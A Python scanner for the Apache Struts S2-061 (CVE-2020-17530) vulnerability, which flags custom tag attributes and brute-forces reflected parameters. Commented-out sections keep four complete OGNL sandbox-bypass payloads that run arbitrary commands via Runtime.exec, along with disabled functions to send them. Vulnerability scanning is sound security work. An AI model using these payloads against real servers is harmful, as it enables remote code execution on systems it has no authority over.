import argparse
import os
import platform
import random
import urllib
from urllib import parse

from bs4 import BeautifulSoup
import requests

tag_a = {'accesskey', 'action', 'anchor', 'class', 'cssClass', 'cssErrorClass', 'cssErrorStyle',
         'cssStyle',
         'disabled', 'encode', 'errorPosition', 'escapeAmp', 'forceAddSchemeHostAndPort', 'href', 'id',
         'includeContext', 'includeParams', 'javascriptTooltip', 'key', 'label', 'labelSeparator',
         'labelposition',
         'method', 'name', 'namespace', 'onblur', 'onchange', 'onclick', 'ondblclick', 'onfocus',
         'onkeydown',
         'onkeypress', 'onkeyup', 'onmousedown', 'onmousemove', 'onmouseout', 'onmouseover', 'onmouseup',
         'onselect',
         'openTemplate', 'portletMode', 'portletUrlType', 'requiredLabel', 'requiredPosition', 'scheme',
         'style',
         'tabindex', 'template', 'templateDir', 'theme', 'title', 'tooltip', 'tooltipConfig',
         'tooltipCssClass',
         'tooltipDelay', 'tooltipIconPath', 'value', 'windowState'}
tag_form = {'acceptcharset', 'accesskey', 'action', 'class', 'cssClass', 'cssErrorClass', 'cssErrorStyle',
            'cssStyle',
            'disabled', 'enctype', 'errorPosition', 'focusElement', 'id', 'includeContext',
            'javascriptTooltip', 'key',
            'label', 'labelSeparator', 'labelposition', 'method', 'name', 'namespace', 'onblur',
            'onchange', 'onclick',
            'ondblclick', 'onfocus', 'onkeydown', 'onkeypress', 'onkeyup', 'onmousedown', 'onmousemove',
            'onmouseout',
            'onmouseover', 'onmouseup', 'onreset', 'onselect', 'onsubmit', 'openTemplate', 'portletMode',
            'requiredLabel', 'requiredPosition', 'style', 'tabindex', 'target', 'template', 'templateDir',
            'theme',
            'title', 'tooltip', 'tooltipConfig', 'tooltipCssClass', 'tooltipDelay', 'tooltipIconPath',
            'validate',
            'value', 'windowState'}
tag_label = {'accesskey', 'class', 'cssClass', 'cssErrorClass', 'cssErrorStyle', 'cssStyle', 'disabled',
             'errorPosition', 'for', 'id', 'javascriptTooltip', 'key', 'label', 'labelSeparator',
             'labelposition',
             'name', 'onblur', 'onchange', 'onclick', 'ondblclick', 'onfocus', 'onkeydown', 'onkeypress',
             'onkeyup',
             'onmousedown', 'onmousemove', 'onmouseout', 'onmouseover', 'onmouseup', 'onselect',
             'requiredLabel',
             'requiredLabel', 'style', 'tabindex', 'template', 'templateDir', 'theme', 'title', 'tooltip',
             'tooltipConfig', 'tooltipCssClass', 'tooltipDelay', 'tooltipIconPath', 'value'}
tag_select = {'accesskey', 'class', 'cssClass', 'cssErrorClass', 'cssErrorStyle', 'cssStyle', 'disabled',
              'emptyOption',
              'errorPosition', 'headerKey', 'headerValue', 'id', 'javascriptTooltip', 'key', 'label',
              'labelSeparator',
              'labelposition', 'list', 'listCssClass', 'listCssStyle', 'listKey', 'listLabelKey',
              'listTitle',
              'listValue', 'listValueKey', 'multiple', 'name', 'onblur', 'onchange', 'onclick',
              'ondblclick', 'onfocus',
              'onkeydown', 'onkeypress', 'onkeyup', 'onmousedown', 'onmousemove', 'onmouseout',
              'onmouseover',
              'onmouseup', 'onselect', 'requiredLabel', 'requiredPosition', 'size', 'style', 'tabindex',
              'template',
              'templateDir', 'theme', 'title', 'tooltip', 'tooltipConfig', 'tooltipCssClass',
              'tooltipDelay',
              'tooltipIconPath', 'value'}
tag_textarea = {'accesskey', 'action', 'anchor', 'class', 'cssClass', 'cssErrorClass', 'cssErrorStyle',
                'cssStyle',
                'disabled', 'encode', 'errorPosition', 'escapeAmp', 'forceAddSchemeHostAndPort', 'href',
                'id',
                'includeContext', 'includeParams', 'javascriptTooltip', 'key', 'label', 'labelSeparator',
                'labelposition', 'method', 'name', 'namespace', 'onblur', 'onchange', 'onclick',
                'ondblclick',
                'onfocus', 'onkeydown', 'onkeypress', 'onkeyup', 'onmousedown', 'onmousemove',
                'onmouseout',
                'onmouseover', 'onmouseup', 'onselect', 'openTemplate', 'portletMode', 'portletUrlType',
                'requiredLabel', 'requiredPosition', 'scheme', 'style', 'tabindex', 'template',
                'templateDir', 'theme',
                'title', 'tooltip', 'tooltipConfig', 'tooltipCssClass', 'tooltipDelay', 'tooltipIconPath',
                'value',
                'windowState'}
tag_input = {'accept', 'accesskey', 'class', 'cssClass', 'cssErrorClass', 'cssErrorStyle', 'cssStyle',
             'disabled',
             'errorPosition', 'id', 'javascriptTooltip', 'key', 'label', 'labelSeparator', 'labelposition',
             'name',
             'onblur', 'onchange', 'onclick', 'ondblclick', 'onfocus', 'onkeydown', 'onkeypress',
             'onkeyup',
             'onmousedown', 'onmousemove', 'onmouseout', 'onmouseover', 'onmouseup', 'onselect',
             'requiredLabel',
             'requiredPosition', 'size', 'style', 'tabindex', 'template', 'templateDir', 'theme', 'title',
             'tooltip',
             'tooltipConfig', 'tooltipCssClass', 'tooltipDelay', 'tooltipIconPath', 'value', 'maxLength',
             'readonly',
             'showPassword', 'type', 'action', 'method', 'openTemplate', 'src', 'fieldValue', 'list',
             'listCssClass',
             'listCssStyle', 'listKey', 'listLabelKey', 'listTitle', 'listValue', 'listValueKey', 'format'}

# payload_1 = "%%7b(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(@java.lang.Runtime@getRuntime().exec('{" \
#             "cmd}'))%7b"
# payload_2 = "%%7b(#container=#context['com.opensymphony.xwork2.ActionContext.container']).(" \
#             "#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(" \
#             "#ognlUtil.excludedClasses.clear()).(#ognlUtil.excludedPackageNames.clear()).(#context.setMemberAccess(" \
#             "@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)).(@java.lang.Runtime@getRuntime().exec('{cmd}'))%7b"
# payload_3_1 = "%%7b(#context=#attr['struts.valueStack'].context).(#container=#context[" \
#               "'com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(" \
#               "@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.setExcludedClasses('')).(" \
#               "#ognlUtil.setExcludedPackageNames(''))%7b"
# payload_3_2 = "%%7b(#context=#attr['struts.valueStack'].context).(#context.setMemberAccess(" \
#               "@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)).(@java.lang.Runtime@getRuntime().exec('{cmd}'))%7b"
# payload_4 = '%%7b(#instancemanager=#application["org.apache.tomcat.InstanceManager"]).(#stack=#attr[' \
#             '"com.opensymphony.xwork2.util.ValueStack.ValueStack"]).(#bean=#instancemanager.newInstance(' \
#             '"org.apache.commons.collections.BeanMap")).(#bean.setBean(#stack)).(#context=#bean.get("context")).(' \
#             '#bean.setBean(#context)).(#macc=#bean.get("memberAccess")).(#bean.setBean(#macc)).(' \
#             '#emptyset=#instancemanager.newInstance("java.util.HashSet")).(#bean.put("excludedClasses",#emptyset)).(' \
#             '#bean.put("excludedPackageNames",#emptyset)).(#arglist=#instancemanager.newInstance(' \
#             '"java.util.ArrayList")).(#arglist.add("{cmd}")).(#execute=#instancemanager.newInstance(' \
#             '"freemarker.template.utility.Execute")).(#execute.exec(#arglist))%7b'


def get_html(url):
    try:
        res = requests.get(url=url)
        response = res.text
        return response
    except Exception as e:
        print("error : ", e, " in ", url)


def find_html(response):
    soup = BeautifulSoup(response, features="lxml")
    # 检测的话，只要找到自定义属性就好了 just find customize attribute！
    founded_list = []
    for tag in soup.find_all('a'):
        for j in tag.attrs.keys():
            if j not in tag_a:
                print("Found customize attribute:", j, " ,tag is :", tag)
                founded_list.append(tag)

    for tag in soup.find_all('form'):
        for j in tag.attrs.keys():
            if j not in tag_form:
                print("Found customize attribute:", j, " ,tag is :", tag)
                founded_list.append(tag)

    for tag in soup.find_all('label'):
        for j in tag.attrs.keys():
            if j not in tag_label:
                print("Found customize attribute:", j, " ,tag is :", tag)
                founded_list.append(tag)
    for tag in soup.find_all('select'):
        for j in tag.attrs.keys():
            if j not in tag_label:
                print("Found customize attribute:", j, " ,tag is :", tag)
                founded_list.append(tag)
    for tag in soup.find_all('textarea'):
        for j in tag.attrs.keys():
            if j not in tag_textarea:
                print("Found customize attribute:", j, " ,tag is :", tag)
                founded_list.append(tag)
    for tag in soup.find_all('input'):
        for j in tag.attrs.keys():
            if j not in tag_input:
                print("Found customize attribute:", j, " ,tag is :", tag)
                founded_list.append(tag)
    return founded_list


def const_poc():
    # 不知道为啥，解码还是啥原因，动态的seed不行，就用蠢方法了。 keyword = 9999qwsasacwce99999999
    # seed = random.randint(100, 1000)
    # keyword = str(seed * seed)
    # poc = "%25%7B{seed}%2a{seed}%7D".format(seed=seed)
    # print(seed)
    # print(keyword)
    # return keyword, poc
    keyword = "9999qwsasacwce99999999"
    return keyword


def blast_member(url, blast_list):
    blast_list = blast_list

    for customize_parm in blast_list:
        try:
            keyword = const_poc()
            data = {customize_parm: keyword}
            response = requests.post(url=url, data=data)
            if keyword in response.text:
                print("Found S2-061! Customize parameter is:", customize_parm, " !")
        except Exception as e:
            print("error : ", e, " in ", url)


def read_file(file):
    blast_list = []
    abs_path = os.getcwd()
    if 'windows' in platform.system().lower():
        file = abs_path + '\\' + 'dict.txt'
    else:
        file = abs_path + '/' + 'dict.txt'
    with open(file, "r") as f:
        data = f.readlines()
        for i in data:
            blast_list.append(i.strip("\n"))
    print(blast_list)
    return blast_list


# 使用外带或者echo检测
# def execute_cmd(url, cmd, attr):
#     url = url
#     cmd = cmd
#     attr = attr
#     payload_type = execute_which(url, attr)

    # if payload_type != 2:
    #     data = {attr: payload[payload_type].format(cmd=cmd)}
    #     requests.post(url=url, data=data)
    #     print('Finished executing ', cmd)
    # else:
    #     data_1 = {attr: str(payload[2][0])}
    #     requests.post(url, data=data_1)
    #
    #     data_2 = {attr: payload[2][1].format(cmd=cmd)}
    #     requests.post(url, data=data_2)
    #     print('Finished executing  ', cmd)


# def execute_which(url, attr):
#     seed = "dfewrfsfdsdsfdsfdsfdsfdsffds"
#     if 'windows' in platform.system().lower():
#         cmd = "cmd /C echo {flag}".format(flag=seed)
#     else:
#         cmd = "echo {flag}".format(flag=seed)
#
#     for i in [0, 1, 2, 3]:
#         if i == 0:
#             data = {attr: payload_1 % cmd}
#             print(data)
#             response = requests.post(url=url, data=data)
#
#             if seed in response.text:
#                 print(response.text)
#                 return i
#         if i == 1:
#             data = {attr: payload_2 % cmd}
#             print(data)
#             response = requests.post(url=url, data=data)
#
#             if seed in response.text:
#                 print(response.text)
#                 return i
#         if i == 2:
#             data_1 = {attr: payload_3_1}
#             requests.post(url, data=data_1)
#
#             data_2 = {attr: payload_3_2 % cmd}
#             response = requests.post(url, data=data_2)
#             if seed in response.text:
#                 print(response.text)
#                 return i
#
#         else:
#             data = {attr: payload_4 % cmd}
#             print(data)
#             response = requests.post(url=url, data=data)
#             print(response.text)
#             if seed in response.text:
#                 return i

        # else:
        #     data_1 = {attr: str(payload[2][0])}
        #     requests.post(url, data=data_1)
        #
        #     data_2 = {attr: payload[2][1].format(cmd=parse.quote(cmd))}
        #     if seed in requests.post(url, data=data_2):
        #         return i


def main(args):
    url = args.url
    if args.blast:
        blast_list = read_file("dict.txt")
        blast_member(url, blast_list)
        exit(0)
    # elif args.cmd:
    #     if args.attr:
    #         cmd = args.cmd
    #         attr = args.attr
    #         execute_cmd(url, cmd, attr)
    #         exit(0)
    #     else:
    #         print("Please input customize attribute parameter ! python S2_061.py -e calc -a skillName")
    #         exit(1)
    else:
        response = get_html(url)
        if response:
            founded_list = find_html(response)
            if founded_list:
                print('{0} exists S2-061，vulnerable tag is {1}'.format(args.url, founded_list))
            else:
                print("{0} is safe .. ".format(url))
            exit(0)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Detect CVE-2020-17530 S2-061 .https://github.com/EvilPulsar/S2-061"
                                                 "Usage：python S2_061.py -u http://example.com ")

    parser.add_argument("-u", "--url", dest="url", type=str, help="python S2_061.py -u http://example.com/index.action")
    parser.add_argument("-b", "--blast", dest="blast", action='store_true',
                        help="python S2_061.py -u http://example.com -b ")
    # parser.add_argument("-e", "--execute", dest="cmd", type=str, help="python S2_061.py -e calc")
    # parser.add_argument("-a", "--attr", dest="attr", type=str, help="python S2_061.py -e calc -a skillName")
    args = parser.parse_args()
    main(args)
